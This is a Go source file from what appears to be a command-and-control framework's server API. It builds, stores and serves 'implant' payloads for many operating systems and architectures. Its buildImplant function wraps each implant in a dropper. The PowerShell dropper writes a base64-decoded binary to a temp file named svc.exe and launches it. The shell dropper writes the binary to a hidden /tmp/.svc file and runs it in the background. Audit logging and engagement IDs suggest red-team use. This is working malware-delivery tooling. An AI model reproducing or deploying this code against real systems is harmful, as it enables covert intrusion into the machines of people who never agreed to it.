package httpapi

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/azizbinmohammad/private-c2/pkg/audit"
	"github.com/azizbinmohammad/private-c2/server/api/authz"
	"github.com/azizbinmohammad/private-c2/server/build"
	"github.com/azizbinmohammad/private-c2/server/store/models"
	"gorm.io/gorm"
)

type payloadHandler struct {
	db      *gorm.DB
	auditor *audit.Logger
}

func (ph *payloadHandler) handlePayloads(w http.ResponseWriter, r *http.Request) {
	setCORS(w)
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	if r.URL.Path != "/api/payloads" {
		writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "not found"})
		return
	}
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
		return
	}
	var payloads []models.PayloadArtifact
	if err := ph.db.Find(&payloads).Error; err != nil {
		writeJSON(w, http.StatusInternalServerError, ErrorResponse{Error: err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, payloads)
}

func (ph *payloadHandler) handlePayloadDetail(w http.ResponseWriter, r *http.Request) {
	setCORS(w)
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	path := strings.TrimPrefix(r.URL.Path, "/api/payloads/")

	if path == "generate" {
		if r.Method != http.MethodPost {
			writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
			return
		}
		var payload models.PayloadArtifact
		if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
			writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "invalid JSON: " + err.Error()})
			return
		}
		if payload.TargetOS == "" {
			writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "target_os is required"})
			return
		}

		arch := payload.TargetArch
		if arch == "" || arch == "auto" {
			arch = "amd64"
		}

		archMap := map[string][]string{
			"windows": {"amd64", "arm64", "386"},
			"linux":   {"amd64", "arm64", "386", "mips", "mipsle", "riscv64"},
			"darwin":  {"amd64", "arm64"},
			"freebsd": {"amd64", "arm64"},
			"ios":     {"arm64"},
			"android": {"arm64", "arm"},
		}

		if arch == "multi" {
			arches, ok := archMap[payload.TargetOS]
			if !ok {
				arches = []string{"amd64"}
			}
			var created []models.PayloadArtifact
			for _, a := range arches {
				p, err := buildImplant(ph.db, payload, payload.TargetOS, a)
				if err != nil {
					status := http.StatusInternalServerError
					if errors.Is(err, build.ErrInvalidRequest) {
						status = http.StatusBadRequest
					}
					writeJSON(w, status, ErrorResponse{Error: fmt.Sprintf("%s/%s: %v", payload.TargetOS, a, err)})
					return
				}
				created = append(created, *p)
			}
			ph.auditPayload(r, audit.EventPayloadGenerate, "payload.generate", payload.TargetOS,
				fmt.Sprintf("%d artifacts", len(created)))
			writeJSON(w, http.StatusCreated, created)
			return
		}

		p, err := buildImplant(ph.db, payload, payload.TargetOS, arch)
		if err != nil {
			status := http.StatusInternalServerError
			if errors.Is(err, build.ErrInvalidRequest) {
				status = http.StatusBadRequest
			}
			writeJSON(w, status, ErrorResponse{Error: err.Error()})
			return
		}
		ph.auditPayload(r, audit.EventPayloadGenerate, "payload.generate",
			p.TargetOS+"/"+p.TargetArch, p.SHA256)
		writeJSON(w, http.StatusCreated, p)
		return
	}

	if path == "download" {
		writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "specify payload ID: /api/payloads/{id}/download"})
		return
	}

	parts := strings.SplitN(path, "/", 2)
	payloadID := parts[0]

	if payloadID == "" {
		writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "missing payload ID"})
		return
	}

	if len(parts) == 1 {
		if r.Method != http.MethodGet {
			writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
			return
		}
		var payload models.PayloadArtifact
		if err := ph.db.First(&payload, "id = ?", payloadID).Error; err != nil {
			writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "payload not found"})
			return
		}
		writeJSON(w, http.StatusOK, payload)
		return
	}

	if parts[1] == "download" {
		if r.Method != http.MethodGet {
			writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
			return
		}
		var payload models.PayloadArtifact
		if err := ph.db.First(&payload, "id = ?", payloadID).Error; err != nil {
			writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "payload not found"})
			return
		}
		if payload.Status == "revoked" {
			writeJSON(w, http.StatusForbidden, ErrorResponse{Error: "payload has been revoked"})
			return
		}
		if len(payload.BinaryData) == 0 {
			writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "no binary data available"})
			return
		}
		ext := ""
		contentType := "application/octet-stream"
		switch payload.Format {
		case "ps1":
			ext = ".ps1"
			contentType = "text/plain"
		case "sh":
			ext = ".sh"
			contentType = "text/plain"
		default:
			switch payload.TargetOS {
			case "windows":
				switch payload.Format {
				case "dll":
					ext = ".dll"
				case "shellcode":
					ext = ".bin"
				default:
					ext = ".exe"
				}
			default:
				if payload.Format == "shared" {
					ext = ".so"
				}
			}
		}
		filename := fmt.Sprintf("implant-%s-%s%s", payload.TargetOS, payload.TargetArch, ext)
		w.Header().Set("Content-Type", contentType)
		w.Header().Set("Content-Disposition", "attachment; filename=\""+filename+"\"")
		w.Header().Set("Content-Length", strconv.Itoa(len(payload.BinaryData)))
		w.Write(payload.BinaryData)
		return
	}

	if parts[1] == "revoke" {
		if r.Method != http.MethodPost {
			writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
			return
		}
		res := ph.db.Model(&models.PayloadArtifact{}).Where("id = ?", payloadID).Update("status", "revoked")
		if res.Error != nil {
			writeJSON(w, http.StatusInternalServerError, ErrorResponse{Error: res.Error.Error()})
			return
		}
		if res.RowsAffected == 0 {
			writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "payload not found"})
			return
		}
		ph.auditPayload(r, audit.EventPayloadRevoke, "payload.revoke", payloadID, "revoked")
		writeJSON(w, http.StatusOK, map[string]string{"status": "revoked"})
		return
	}

	writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "not found"})
}

func (ph *payloadHandler) auditPayload(r *http.Request, event audit.EventType, action, target, result string) {
	if ph.auditor == nil {
		return
	}
	identity, _ := authz.FromContext(r.Context())
	operator := identity.OperatorID
	if operator == "" {
		operator = identity.Username
	}
	_ = ph.auditor.Log(operator, "", "", event, action, target, result, nil, r.RemoteAddr, "")
}

func buildImplant(db *gorm.DB, base models.PayloadArtifact, goos, goarch string) (*models.PayloadArtifact, error) {
	root, err := build.FindProjectRoot()
	if err != nil {
		return nil, err
	}
	caPEM, err := os.ReadFile(filepath.Join(root, "certs", "ca-cert.pem"))
	if err != nil {
		return nil, fmt.Errorf("read CA certificate for payload embedding: %w", err)
	}
	certPEM, err := os.ReadFile(filepath.Join(root, "certs", "implant-cert.pem"))
	if err != nil {
		return nil, fmt.Errorf("read implant certificate for payload embedding: %w", err)
	}
	keyPEM, err := os.ReadFile(filepath.Join(root, "certs", "implant-key.pem"))
	if err != nil {
		return nil, fmt.Errorf("read implant key for payload embedding: %w", err)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
	defer cancel()
	artifact, err := build.Build(ctx, root, build.BuildRequest{
		TargetOS:      goos,
		TargetArch:    goarch,
		Format:        base.Format,
		Transports:    base.Transports,
		Mode:          base.Mode,
		EngagementID:  base.EngagementID,
		CACertPEM:     caPEM,
		ClientCertPEM: certPEM,
		ClientKeyPEM:  keyPEM,
		IntervalMs:    5000,
		JitterPct:     20,
	})
	if err != nil {
		return nil, err
	}

	binData := artifact.Binary
	switch base.Format {
	case "ps1":
		encoded := base64.StdEncoding.EncodeToString(binData)
		script := fmt.Sprintf("$b = [Convert]::FromBase64String('%s')\n$p = \"$env:TEMP\\svc.exe\"\n[IO.File]::WriteAllBytes($p, $b)\nStart-Process -FilePath $p\n", encoded)
		binData = []byte(script)
	case "sh":
		encoded := base64.StdEncoding.EncodeToString(binData)
		script := fmt.Sprintf("#!/bin/sh\npayload='%s'\necho \"$payload\" | { base64 -d 2>/dev/null || base64 -D; } > /tmp/.svc\nchmod +x /tmp/.svc\n/tmp/.svc &\n", encoded)
		binData = []byte(script)
	}

	hash := sha256.Sum256(binData)
	sha := hex.EncodeToString(hash[:])

	// Identical builds are common (same config, same target). Return the
	// existing artifact instead of failing the SHA-256 unique index.
	var existing models.PayloadArtifact
	if err := db.Where("sha256 = ?", sha).First(&existing).Error; err == nil {
		return &existing, nil
	}

	payload := base
	payload.ID = ""
	payload.TargetOS = goos
	payload.TargetArch = goarch
	payload.Status = "active"
	payload.SHA256 = sha
	payload.FileSize = int64(len(binData))
	payload.BinaryData = binData

	if err := db.Create(&payload).Error; err != nil {
		return nil, fmt.Errorf("save payload: %w", err)
	}

	return &payload, nil
}
